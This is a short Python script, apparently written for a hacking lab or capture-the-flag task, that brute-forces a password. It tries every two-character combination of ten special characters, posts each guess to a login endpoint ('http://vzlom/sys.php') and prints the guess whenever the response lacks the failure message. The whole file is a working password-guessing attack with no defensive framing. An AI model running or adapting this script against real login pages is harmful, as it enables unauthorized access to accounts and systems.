import requests

sus =  "!@#$%^&*()"

for i in range(len(sus)):
    for g in range(len(sus)):
        
        r=requests.post("http://vzlom/sys.php", data={"ps":sus[i] + sus[g]})

        if r.text.find (" NO RIGHT PASSWORD") >0:
            pass

        else:
            print("successful, -->{", sus[i] + sus[g], "}<--password") 